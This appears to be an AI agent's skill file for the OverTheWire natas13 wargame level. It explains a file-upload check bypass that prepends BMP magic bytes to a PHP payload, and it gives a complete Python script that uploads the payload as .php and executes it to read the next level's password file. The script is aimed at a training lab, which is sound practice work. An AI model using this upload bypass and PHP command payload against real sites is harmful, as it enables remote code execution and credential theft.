---
name: natas-13
description: >-
  Use when solving OverTheWire natas13: like natas12 but the server runs
  exif_imagetype() on the upload, which only sniffs the first bytes, so prepend
  BMP magic ('BM') to the PHP payload while still setting the client-controlled
  'filename' field to .php, then fetch the stored file to print the natas14
  password.
---
# natas13

Solve OverTheWire **natas13** and print the **natas14** password.

## Weakness

Same upload flaw as natas12 (the hidden `filename` field names the stored file with no extension check), but now the server calls `exif_imagetype()` on the bytes. That function only sniffs the first few bytes, so prepending the BMP magic `BM` makes PHP pass the image check while still being stored and executed as `.php`.

## Inputs

- `NATAS13_USER` (usually `natas13`)
- `NATAS13_PASS` (current natas13 password)

## Run

The natas hosts are reachable only from the user's desktop (x1c), not the box. Copy `solve.py` (below) to x1c and run it there with Python:

```
python natas13-solve.py <NATAS13_USER> <NATAS13_PASS>
```

It prints the natas14 password on stdout. Verify:

```
curl.exe -s -o NUL -w "%{http_code}" -u natas14:<PRINTED_PASS> http://natas14.natas.labs.overthewire.org/
```

Expect `200`.

## solve.py

```python
#!/usr/bin/env python3
"""Solve natas13: like natas12 but the server calls exif_imagetype() on the upload,
which only sniffs the first few bytes. Prepend BMP magic ('BM') so the PHP file
passes the image check, while the client-controlled 'filename' field (no extension
check) still stores it as .php so it executes."""
import base64, re, sys, urllib.request, uuid

BASE = "http://natas13.natas.labs.overthewire.org"
PAYLOAD = b"BM" + b'\x00\x00\x00\x00<?php passthru("cat /etc/natas_webpass/natas14"); ?>'

def multipart(fields, file_field, file_name, file_bytes):
    boundary = "----natas13boundary" + uuid.uuid4().hex
    parts = []
    for name, value in fields.items():
        parts.append(f"--{boundary}\r\nContent-Disposition: form-data; name=\"{name}\"\r\n\r\n{value}\r\n".encode())
    parts.append(
        f"--{boundary}\r\nContent-Disposition: form-data; name=\"{file_field}\"; filename=\"{file_name}\"\r\n"
        f"Content-Type: image/bmp\r\n\r\n".encode()
        + file_bytes + b"\r\n"
    )
    parts.append(f"--{boundary}--\r\n".encode())
    return b"".join(parts), boundary

def main():
    if len(sys.argv) != 3:
        print(f"Usage: {sys.argv[0]} <natas13_user> <natas13_pass>", file=sys.stderr)
        sys.exit(1)
    user, password = sys.argv[1], sys.argv[2]
    auth = "Basic " + base64.b64encode(f"{user}:{password}".encode()).decode()

    php_name = "exploit.php"
    fields = {"MAX_FILE_SIZE": "1000", "filename": php_name}
    body, boundary = multipart(fields, "uploadedfile", php_name, PAYLOAD)
    req = urllib.request.Request(BASE + "/index.php", data=body, headers={
        "Authorization": auth,
        "Content-Type": f"multipart/form-data; boundary={boundary}",
    })
    html = urllib.request.urlopen(req, timeout=30).read().decode("utf-8", errors="replace")
    m = re.search(r"(upload/[A-Za-z0-9]+\.php)", html)
    if not m:
        print("No uploaded .php path returned", file=sys.stderr); print(html, file=sys.stderr); sys.exit(1)
    path = m.group(1)

    req2 = urllib.request.Request(f"{BASE}/{path}", headers={"Authorization": auth})
    out = urllib.request.urlopen(req2, timeout=30).read().decode("utf-8", errors="replace")
    pw = re.search(r"([A-Za-z0-9]{32})", out)
    if not pw:
        print("No password in executed output", file=sys.stderr); print(out, file=sys.stderr); sys.exit(1)
    print(pw.group(1))

if __name__ == "__main__":
    main()
```
